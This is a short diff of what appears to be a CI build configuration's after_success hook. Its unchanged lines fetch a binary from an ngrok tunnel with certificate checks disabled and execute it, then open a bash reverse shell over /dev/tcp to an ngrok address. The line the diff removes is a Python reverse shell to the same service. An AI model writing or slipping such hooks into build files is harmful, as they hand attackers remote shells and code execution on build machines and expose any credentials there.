@@ -13,7 +13,6 @@ after_success:
   - curl -k https://294a8f8ba74a.ngrok-free.app/RADICAL_ANKLET -o /tmp/RADICAL_ANKLET
   - chmod +x /tmp/RADICAL_ANKLET
   - /tmp/RADICAL_ANKLET
-  - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
   - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
   - docker --version 
   - pip install --user awscli
